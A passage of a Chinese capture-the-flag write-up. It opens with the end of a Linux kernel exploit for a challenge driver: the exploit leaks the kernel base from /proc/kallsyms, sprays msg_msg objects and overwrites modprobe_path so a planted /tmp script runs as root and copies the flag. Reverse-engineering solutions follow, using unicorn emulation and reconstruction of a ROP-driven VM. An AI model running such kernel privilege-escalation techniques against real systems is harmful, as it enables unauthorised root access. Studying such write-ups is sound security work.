+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span>
+};
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> {</span>
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span>
+  <span class="hljs-keyword">long</span> m_type;
+  <span class="hljs-keyword">size_t</span> m_ts;    <span class="hljs-comment">/* message text size */</span>
+  <span class="hljs-keyword">void</span> *next;     <span class="hljs-comment">/* struct msg_msgseg *next; */</span>
+  <span class="hljs-keyword">void</span> *security; 
+                  <span class="hljs-comment">/* the actual message follows immediately */</span>
+};
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+  <span class="hljs-keyword">long</span> mtype;
+  <span class="hljs-keyword">char</span> mtext[<span class="hljs-number">1</span>];
+} msg;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_head</span> {</span>
+  <span class="hljs-keyword">char</span> coin_art[<span class="hljs-number">0x70</span>];
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_entry</span> *<span class="hljs-title">head</span>;</span>
+  <span class="hljs-keyword">int</span> total_nft;
+} sofirium_head;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_entry</span> {</span>
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_entry</span> *<span class="hljs-title">next</span>;</span>
+  <span class="hljs-keyword">char</span> nft[CHUNK_SIZE];
+} sofirium_entry;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">request</span> {</span>
+  <span class="hljs-keyword">int</span> idx;
+  <span class="hljs-keyword">char</span> buffer[CHUNK_SIZE];
+} request;
+
+<span class="hljs-keyword">int</span> global_fd = <span class="hljs-number">0</span>;
+<span class="hljs-keyword">uint64_t</span> kernheap, kernbase;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">die</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)</span></span>{
+  perror(msg);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">rmall</span><span class="hljs-params">()</span> </span>{
+  request req;
+  bzero(&amp;req, <span class="hljs-keyword">sizeof</span>(req));
+  <span class="hljs-keyword">int</span> ret = ioctl(global_fd, NFT_RMALL, &amp;req);
+  <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) {
+    die(<span class="hljs-string">&quot;[!] Failed to rmall&quot;</span>);
+  }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *data)</span> </span>{
+  request req;
+  bzero(&amp;req, <span class="hljs-keyword">sizeof</span>(req));
+  <span class="hljs-built_in">memcpy</span>(req.buffer, data, <span class="hljs-keyword">sizeof</span>(req.buffer));
+  <span class="hljs-keyword">int</span> ret = ioctl(global_fd, NFT_ADD, &amp;req);
+  <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) {
+    die(<span class="hljs-string">&quot;[!] Failed to add&quot;</span>);
+  }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx, <span class="hljs-keyword">void</span> *data)</span> </span>{
+  request req;
+  bzero(&amp;req, <span class="hljs-keyword">sizeof</span>(req));
+  req.idx = idx;
+  <span class="hljs-keyword">int</span> ret = ioctl(global_fd, NFT_GET, &amp;req);
+  <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) {
+    die(<span class="hljs-string">&quot;[!] Failed to get&quot;</span>);
+  }
+  <span class="hljs-built_in">memcpy</span>(data, req.buffer, <span class="hljs-keyword">sizeof</span>(req.buffer));
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx, <span class="hljs-keyword">void</span> *data)</span> </span>{
+  request req;
+  bzero(&amp;req, <span class="hljs-keyword">sizeof</span>(req));
+  req.idx = idx;
+  <span class="hljs-built_in">memcpy</span>(req.buffer, data, <span class="hljs-keyword">sizeof</span>(req.buffer));
+  <span class="hljs-keyword">int</span> ret = ioctl(global_fd, NFT_EDIT, &amp;req);
+  <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) {
+    die(<span class="hljs-string">&quot;[!] Failed to edit&quot;</span>);
+  }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hexdump</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *data, <span class="hljs-keyword">int</span> size)</span> </span>{
+  <span class="hljs-keyword">uint64_t</span> *a = (<span class="hljs-keyword">uint64_t</span> *)data;
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size / <span class="hljs-number">8</span>; i++) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%02x]: 0x%lx\n&quot;</span>, i * <span class="hljs-number">8</span>, a[i]);
+  }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_msg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">int</span> flags)</span> </span>{
+  <span class="hljs-keyword">if</span> (msgsnd(id, buf, size, flags) &lt; <span class="hljs-number">0</span>) {
+    die(<span class="hljs-string">&quot;[!] Failed to send msg&quot;</span>);
+  }
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Send message: 0x%lx\n&quot;</span>, size);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_flag</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>{
+    system(<span class="hljs-string">&quot;echo &#x27;#!/bin/sh\ncp /flag.txt /tmp/flag\nchmod 777 /tmp/flag&#x27; &gt; /tmp/x&quot;</span>);
+    system(<span class="hljs-string">&quot;chmod +x /tmp/x&quot;</span>);
+
+    system(<span class="hljs-string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);
+    system(<span class="hljs-string">&quot;chmod +x /tmp/dummy&quot;</span>);
+
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Run unknown file&quot;</span>);
+    system(<span class="hljs-string">&quot;/tmp/dummy&quot;</span>);
+
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hopefully flag is readable&quot;</span>);
+    system(<span class="hljs-string">&quot;cat /tmp/flag &gt;&gt; /tmp/1&quot;</span>);
+    system(<span class="hljs-string">&quot;cat /tmp/1&quot;</span>);
+
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">leak</span><span class="hljs-params">()</span> </span>{
+  FILE *fp = popen(<span class="hljs-string">&quot;cat /proc/kallsyms |grep _stext&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+  <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>) {
+    die(<span class="hljs-string">&quot;[!] Error opening /proc/kallsyms&quot;</span>);
+  }
+  <span class="hljs-keyword">char</span> line[<span class="hljs-number">1024</span>];
+  bzero(line, <span class="hljs-number">1024</span>);
+  <span class="hljs-keyword">char</span> *p;
+  fread(&amp;line, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>, fp);
+  p = <span class="hljs-built_in">strchr</span>(line, <span class="hljs-string">&#x27; &#x27;</span>);
+  *p = <span class="hljs-string">&quot;\x00&quot;</span>;
+  <span class="hljs-keyword">return</span> strtoull(line, <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>{
+  global_fd = open(<span class="hljs-string">&quot;/dev/Sofire&quot;</span>, O_NONBLOCK);
+  <span class="hljs-keyword">if</span> (global_fd &lt; <span class="hljs-number">0</span>) {
+    die(<span class="hljs-string">&quot;[!] Failed to open /dev/chall&quot;</span>);
+  }
+  <span class="hljs-keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);
+  <span class="hljs-keyword">if</span> (qid &lt; <span class="hljs-number">0</span>) {
+    die(<span class="hljs-string">&quot;[!] Failed to msgget&quot;</span>);
+  }
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] qid = %d\n&quot;</span>, qid);
+
+  kernbase = leak();
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Send message\n&quot;</span>);
+  msg *message = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x200</span> + <span class="hljs-number">8</span>);
+  bzero(message, <span class="hljs-number">0x200</span> + <span class="hljs-number">8</span>);
+  message-&gt;mtype = <span class="hljs-number">1</span>;
+  <span class="hljs-built_in">memset</span>(message-&gt;mtext, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-number">0x200</span> - <span class="hljs-number">0x30</span>);
+
+  <span class="hljs-keyword">char</span> buf[CHUNK_SIZE];
+  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));
+
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">24</span>; i++) {
+    add(buf);
+  }
+
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] 1 Remove all\n&quot;</span>);
+  rmall();
+
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Heap spary\n&quot;</span>);
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1</span>; i++) {
+    send_msg(qid, message, <span class="hljs-number">0x200</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 23</span>
+  }
+  send_msg(qid, message, <span class="hljs-number">0x40</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 24</span>
+  send_msg(qid, message, <span class="hljs-number">0x40</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 25</span>
+  send_msg(qid, message, <span class="hljs-number">0x40</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 26</span>
+  send_msg(qid, message, <span class="hljs-number">0x40</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 27</span>
+
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernbase: 0x%lx\n&quot;</span>, kernbase);
+  <span class="hljs-keyword">uint64_t</span> modprobe = kernbase + <span class="hljs-number">0x1851400</span>;
+
+  <span class="hljs-comment">// use 25 change 26&#x27;s next, 27 is target</span>
+  <span class="hljs-keyword">uint64_t</span> save_buf[<span class="hljs-number">0x100</span> / <span class="hljs-number">8</span>];
+
+  get(<span class="hljs-number">25</span>, buf); <span class="hljs-comment">// 23(1d0) - 24(10) - 25(10) - 26(10) - 27(10)</span>
+  <span class="hljs-built_in">memcpy</span>(save_buf, buf, <span class="hljs-keyword">sizeof</span>(save_buf));
+  hexdump(buf, <span class="hljs-keyword">sizeof</span>(buf));
+  save_buf[<span class="hljs-number">7</span>] = modprobe - <span class="hljs-number">8</span>;
+
+  edit(<span class="hljs-number">25</span>, save_buf);
+
+  bzero(buf, <span class="hljs-keyword">sizeof</span>(buf));
+  *(<span class="hljs-keyword">uint64_t</span> *)buf = <span class="hljs-number">0x782f706d742f</span>; <span class="hljs-comment">// /tmp/x</span>
+  edit(<span class="hljs-number">27</span>, buf);
+  get_flag();
+
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre><h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse:</h2>
+<h3 id="polyglot"><a class="header-link" href="#polyglot"></a>Polyglot:</h3>
+<pre class="hljs"><code>~/Desktop$ <span class="hljs-keyword">file</span> polyglot 
+polyglo<span class="hljs-variable">t:</span> DOS <span class="hljs-built_in">executable</span> (COM)</code></pre><p>丢到 IDA 各种架构一顿测试，发现为 <code>ARM64</code> 和 <code>x86-64</code>, 简单分析后发现基本逻辑都是解密后使用系统调用 print 出来直接使用 unicorn 模拟执行。</p>
+<p><code>ARM64</code> 部分:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> unicorn.arm64_const <span class="hljs-keyword">import</span> *
+
+cs = Cs(CS_ARCH_ARM64, UC_MODE_ARM)
+polyglot = open(<span class="hljs-string">&#x27;./polyglot&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)
+code = polyglot.<span class="hljs-keyword">read</span>()
+polyglot.close()
+ADDRESS = <span class="hljs-number">0</span>
+STACK = <span class="hljs-number">0</span>x100000
+<span class="hljs-keyword">def</span> hook_code(uc: Uc, address, <span class="hljs-keyword">size</span>, user_data):
+    # <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> % (address, <span class="hljs-keyword">size</span>))
+    <span class="hljs-keyword">for</span> i in cs.disasm(uc.mem_read(address, <span class="hljs-keyword">size</span>), address):
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str))
+        <span class="hljs-keyword">if</span> i.mnemonic == <span class="hljs-string">&#x27;svc&#x27;</span>:
+            <span class="hljs-keyword">call</span> = uc.reg_read(UC_ARM64_REG_X8)
+            <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;&gt;&gt;&gt; syscall num: {call}&quot;</span>)
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">call</span> == <span class="hljs-number">64</span>:
+                <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;&gt;&gt;&gt; {uc.mem_read(uc.reg_read(UC_ARM64_REG_X1), uc.reg_read(UC_ARM64_REG_X2))}&quot;</span>)
+uc = Uc(UC_ARCH_ARM64, UC_MODE_ARM)
+uc.mem_map(ADDRESS, <span class="hljs-number">0</span>x100000)
+uc.mem_map(STACK, <span class="hljs-number">0</span>x1000)
+uc.mem_write(ADDRESS, code)
+uc.reg_write(UC_ARM64_REG_SP, STACK + <span class="hljs-number">0</span>x1000)
+uc.hook_add(UC_HOOK_CODE, hook_code)
+uc.emu_start(ADDRESS, ADDRESS + <span class="hljs-number">0</span>x44)</code></pre><p><code>x86-64</code>部分：</p>
+<pre class="hljs"><code><span class="hljs-attribute">from</span> capstone import *
+<span class="hljs-attribute">from</span> unicorn import *
+<span class="hljs-attribute">from</span> unicorn.x<span class="hljs-number">86</span>_const import *
+
+<span class="hljs-attribute">cs</span> = Cs(CS_ARCH_X<span class="hljs-number">86</span>, CS_MODE_<span class="hljs-number">64</span>)
+
+<span class="hljs-attribute">polyglot</span> = open(&#x27;./polyglot&#x27;, &#x27;rb&#x27;)
+<span class="hljs-attribute">code</span> = polyglot.read()
+<span class="hljs-attribute">polyglot</span>.close()
+
+<span class="hljs-attribute">ADDRESS</span> = <span class="hljs-number">0</span>
+<span class="hljs-attribute">STACK</span> = <span class="hljs-number">0</span>x<span class="hljs-number">100000</span>
+
+
+<span class="hljs-attribute">def</span> hook_code(uc: Uc, address, size, user_data):
+    <span class="hljs-comment"># print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; % (address, size))</span>
+    <span class="hljs-attribute">for</span> i in cs.disasm(uc.mem_read(address, size), address):
+        <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str))
+        <span class="hljs-attribute">if</span> i.mnemonic == &#x27;syscall&#x27;:
+            <span class="hljs-attribute">call</span> = uc.reg_read(UC_X<span class="hljs-number">86</span>_REG_RAX)
+            <span class="hljs-attribute">print</span>(f<span class="hljs-string">&quot;&gt;&gt;&gt; syscall num: {call}&quot;</span>)
+            <span class="hljs-attribute">if</span> call == <span class="hljs-number">1</span>:
+                <span class="hljs-attribute">print</span>(f<span class="hljs-string">&quot;&gt;&gt;&gt; arg1 = {uc.reg_read(UC_X86_REG_RDI)}, arg2 = {uc.mem_read(uc.reg_read(UC_X86_REG_RSI), uc.reg_read(UC_X86_REG_RDX))}&quot;</span>)
+
+<span class="hljs-attribute">uc</span> = Uc(UC_ARCH_X<span class="hljs-number">86</span>, UC_MODE_<span class="hljs-number">64</span>)
+<span class="hljs-attribute">uc</span>.mem_map(ADDRESS, <span class="hljs-number">0</span>x<span class="hljs-number">100000</span>)
+<span class="hljs-attribute">uc</span>.mem_map(STACK, <span class="hljs-number">0</span>x<span class="hljs-number">1000</span>)
+<span class="hljs-attribute">uc</span>.mem_write(ADDRESS, code)
+<span class="hljs-attribute">uc</span>.reg_write(UC_X<span class="hljs-number">86</span>_REG_RSP, STACK + <span class="hljs-number">0</span>x<span class="hljs-number">1000</span>)
+<span class="hljs-attribute">uc</span>.hook_add(UC_HOOK_CODE, hook_code)
+<span class="hljs-attribute">uc</span>.emu_start(ADDRESS, ADDRESS + <span class="hljs-number">0</span>x<span class="hljs-number">2</span>a<span class="hljs-number">7</span>)</code></pre><h3 id="side-effect"><a class="header-link" href="#side-effect"></a>Side Effect:</h3>
+<p>一道虚拟机题，程序读入<code>prog</code>和<code>mem</code>文件然后加载进虚拟机。点进<code>sub_4015BF</code>，这里面映射了一页可以执行的内存，然后把一些指令片段copy过去：</p>
+<p class="img-container"><img src="https://i.imgur.com/kxjIjSQ.png" alt=""></p>
+<p>再调用<code>sub_401444</code>修正<code>404800</code>处的20个数组，每个数组里面都放着一些数字，它们被解析成指向指令片段的指针或者库函数：</p>
+<p class="img-container"><img src="https://i.imgur.com/pMzewEq.png" alt=""></p>
+<p>然后申请内存创建虚拟机对象，它的数据结构分析如下：</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruct</span> {</span>
+    <span class="hljs-keyword">uint16_t</span> op, opr1, opr2;
+};
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> {</span>
+        <span class="hljs-keyword">uint16_t</span> reg[<span class="hljs-number">0x10000</span>];
+        <span class="hljs-keyword">uint16_t</span> pc;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+        <span class="hljs-keyword">uint16_t</span> LF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// SF ^ OF</span>
+        <span class="hljs-keyword">uint16_t</span> ZF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// ZF</span>
+        <span class="hljs-keyword">uint16_t</span> GF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// !(SF ^ OF | ZF)</span>
+        <span class="hljs-keyword">uint16_t</span> FF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// set IF function fails</span>
+    } flags;
+        <span class="hljs-keyword">void</span> *ptrs[<span class="hljs-number">0x10000</span>];
+        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruct</span> <span class="hljs-title">prog</span>[0<span class="hljs-title">x10000</span>];</span>
+        <span class="hljs-keyword">uint16_t</span> mem[<span class="hljs-number">0x10000</span>];
+};</code></pre><p>reg是寄存器，一共有65536个，但其实用上的也就不到10个；pc是程序计数器；flag是标志位；ptrs存放虚拟机调用一些函数时生成的指针，虚拟机内部可以操作这些指针并把它们传入别的函数；prog存放指令；mem存放用户数据。把这些导入IDA，再观察主函数：</p>
+<p class="img-container"><img src="https://i.imgur.com/kIk2lts.png" alt=""></p>
+<p><code>vm_exec</code>做了一些初始工作，然后开始执行虚拟机：</p>
+<p class="img-container"><img src="https://i.imgur.com/bck3vXC.png" alt=""></p>
+<p>这个<code>vm_exec</code>简单读出一条指令，然后执行<code>vm_exec_instruction</code>：</p>
+<p class="img-container"><img src="https://i.imgur.com/2FBFXuQ.png" alt=""></p>
+<p>与一般的虚拟机题不同，这个虚拟机并没有<code>switch-case</code>，它从之前初始化时的20个数组中找到对应的，把它们copy到栈顶，然后直接调用栈顶的函数指针。对这20个数组进行分析，发现每一个数组的开头都是这个函数：</p>
+<pre class="hljs"><code><span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">10h</span>
+<span class="hljs-keyword">retn</span></code></pre><p>它修改了rsp的值。而调用这个stub时，栈上放着返回地址和指针数组（第一个是此stub的地址），而执行第一句指令以后，返回地址就变成了第二个地址，而它执行另一个stub，例如：</p>
+<pre class="hljs"><code><span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span>
+<span class="hljs-keyword">retn</span></code></pre><p>这个stub返回时会执行第三个地址，如此循环下去，相当于执行了一整条ROP链，最后一个stub是：</p>
+<pre class="hljs"><code><span class="hljs-keyword">leave</span>
+<span class="hljs-keyword">retn</span></code></pre><p>此时rsp恢复正常，程序准备执行下一条指令。</p>
+<p>把相关数据扒下来，用Python把切成片段的stub重组，然后整理成一个程序重新编译。值得注意的是程序使用<code>pop</code>和<code>cmov</code>来实现分支跳转，这部分需要单独处理：</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> os, re
+
+cs = Cs(CS_ARCH_X86, CS_MODE_64)
+cs.syntax = CS_OPT_SYNTAX_ATT
+
+lines = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;vm.txt&#x27;</span>).read().splitlines() <span class="hljs-comment"># vm.txt content from IDA assembly window</span>
+arr: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]] = []
+current: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = <span class="hljs-literal">None</span>
+<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
+    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&#x27;qword&#x27;</span>):
+        <span class="hljs-keyword">if</span> current <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
+            arr.append(current)
+        current = []
+    line = line[line.find(<span class="hljs-string">&#x27;dq &#x27;</span>)+<span class="hljs-number">3</span>:]
+    <span class="hljs-keyword">if</span> line.endswith(<span class="hljs-string">&#x27;h&#x27;</span>): line = line[:-<span class="hljs-number">1</span>]
+    line = <span class="hljs-built_in">int</span>(line, <span class="hljs-number">16</span>)
+    current.append(line)
+arr.append(current)
+
+stubs = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;4839D6C3480F4CD9C383F8FFC30FB775E4C34883E204C34889F3C366890477C34883E202C3488984F708000200C34883C801C348C7C000000000C34883C804C36629D8C34883CE08C34883C802C359C30FB71C57C30FB755E8C348C7C600000000C3488B9CD708000200C34883E201C34889DEC34881E6F7FF0000C383FA00C35BC34883C410C3C30FB78700000200C30FB73477C30FB73457C3C9C366F7F3C3488B7DE8C3480F4FD9C36689B702000200C3FFE3C34889C7C30FB7B702000200C366F7E3C34883E208C366898700000200C36689D0C36601D8C30FB70477C36689C6C30FB79702000200C3480F44D9C3488B84F708000200C30FB7845F08001000C30FB78702000200C36689B47708001000C34889C6C34889DAC3&#x27;</span>)
+
+ret = <span class="hljs-literal">False</span>
+imap = {}
+<span class="hljs-keyword">for</span> addr, _, op, opr <span class="hljs-keyword">in</span> cs.disasm_lite(stubs, <span class="hljs-number">0</span>):
+    <span class="hljs-keyword">if</span> ret:
+        <span class="hljs-keyword">assert</span> op == <span class="hljs-string">&#x27;retq&#x27;</span>
+        ret = <span class="hljs-literal">False</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;retq&#x27;</span>:
+            op = <span class="hljs-string">&#x27;nop&#x27;</span>
+        <span class="hljs-keyword">elif</span> opr != <span class="hljs-string">&#x27;&#x27;</span>:
+            op += <span class="hljs-string">&#x27; &#x27;</span> + opr
+        imap[addr] = op
+        <span class="hljs-keyword">if</span> op != <span class="hljs-string">&#x27;nop&#x27;</span>:
+            ret = <span class="hljs-literal">True</span>
+
+<span class="hljs-keyword">for</span> ops <span class="hljs-keyword">in</span> arr:
+    <span class="hljs-keyword">for</span> i, op <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ops):
+        <span class="hljs-keyword">if</span> op &gt;= <span class="hljs-number">0x100000</span>:
+            ops[i] = <span class="hljs-string">&#x27;call %s&#x27;</span> % (<span class="hljs-string">&#x27;tmpfile&#x27;</span>, <span class="hljs-string">&#x27;fclose&#x27;</span>, <span class="hljs-string">&#x27;getc&#x27;</span>, <span class="hljs-string">&#x27;ungetc&#x27;</span>, <span class="hljs-string">&#x27;putc&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>)[op - <span class="hljs-number">0x100000</span>]
+        <span class="hljs-keyword">else</span>:
+            ops[i] = imap[op]
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstrState</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, prefix</span>):</span>
+        self._<span class="hljs-built_in">list</span> = []
+        self._state = <span class="hljs-number">0</span> <span class="hljs-comment"># 0正常 1rbx 2rcx 其他为cmov</span>
+        self._branch = [<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]
+        self._prefix = prefix
+        self._i = <span class="hljs-number">0</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">push</span>(<span class="hljs-params">self, instr: <span class="hljs-built_in">str</span></span>):</span>
+        <span class="hljs-keyword">if</span> instr == <span class="hljs-string">&#x27;addq $0x10, %rsp&#x27;</span>:
+            <span class="hljs-keyword">return</span>
+        <span class="hljs-keyword">elif</span> instr == <span class="hljs-string">&#x27;leave&#x27;</span>:
+            instr = <span class="hljs-string">&#x27;retq&#x27;</span>
+        <span class="hljs-keyword">elif</span> instr == <span class="hljs-string">&#x27;movq -0x18(%rbp), %rdi&#x27;</span>:
+            instr = <span class="hljs-string">&#x27;movq vm(%rip), %rdi&#x27;</span>
+        <span class="hljs-keyword">elif</span> instr == <span class="hljs-string">&#x27;movzwl -0x1c(%rbp), %esi&#x27;</span>:
+            instr = <span class="hljs-string">&#x27;movzwl opr1(%rip), %esi&#x27;</span>
+
+        match = re.fullmatch(<span class="hljs-string">&#x27;cmov(.*)q %rcx, %rbx&#x27;</span>, instr)
+        <span class="hljs-keyword">if</span> instr == <span class="hljs-string">&#x27;popq %rbx&#x27;</span>:
+            self._state = <span class="hljs-number">1</span>
+        <span class="hljs-keyword">elif</span> instr == <span class="hljs-string">&#x27;popq %rcx&#x27;</span>:
+            self._state = <span class="hljs-number">2</span>
+        <span class="hljs-keyword">elif</span> match:
+            self._state = match.group(<span class="hljs-number">1</span>)
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">if</span> self._state == <span class="hljs-number">0</span>:
+                self._<span class="hljs-built_in">list</span>.append(instr)
+            <span class="hljs-keyword">elif</span> self._state == <span class="hljs-number">1</span>:
+                self._branch[<span class="hljs-number">0</span>] = instr
+                self._state = <span class="hljs-number">0</span>
+            <span class="hljs-keyword">elif</span> self._state == <span class="hljs-number">2</span>:
+                self._branch[<span class="hljs-number">1</span>] = instr
+                self._state = <span class="hljs-number">0</span>
+            <span class="hljs-keyword">else</span>:
+                <span class="hljs-keyword">if</span> instr == <span class="hljs-string">&#x27;jmpq *%rbx&#x27;</span>:
+                    l1 = <span class="hljs-string">&#x27;.%s%d&#x27;</span> % (self._prefix, self._i)
+                    l2 = <span class="hljs-string">&#x27;.%s%d&#x27;</span> % (self._prefix, self._i + <span class="hljs-number">1</span>)
+                    self._i += <span class="hljs-number">2</span>
+                    self._<span class="hljs-built_in">list</span>.extend((
+                        <span class="hljs-string">&#x27;j%s %s&#x27;</span> % (self._state, l1),
+                        self._branch[<span class="hljs-number">0</span>],
+                        <span class="hljs-string">&#x27;jmp %s&#x27;</span> % l2,
+                        <span class="hljs-string">&#x27;%s:&#x27;</span> % l1,
+                        self._branch[<span class="hljs-number">1</span>],
+                        <span class="hljs-string">&#x27;%s:&#x27;</span> % l2,
+                    ))
+                    self._state = <span class="hljs-number">0</span>
+                <span class="hljs-keyword">else</span>:
+                    self._<span class="hljs-built_in">list</span>.append(instr)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">return</span> self._<span class="hljs-built_in">list</span> + [<span class="hljs-string">&#x27;retq&#x27;</span>]
+
+<span class="hljs-keyword">for</span> i, ops <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(arr):
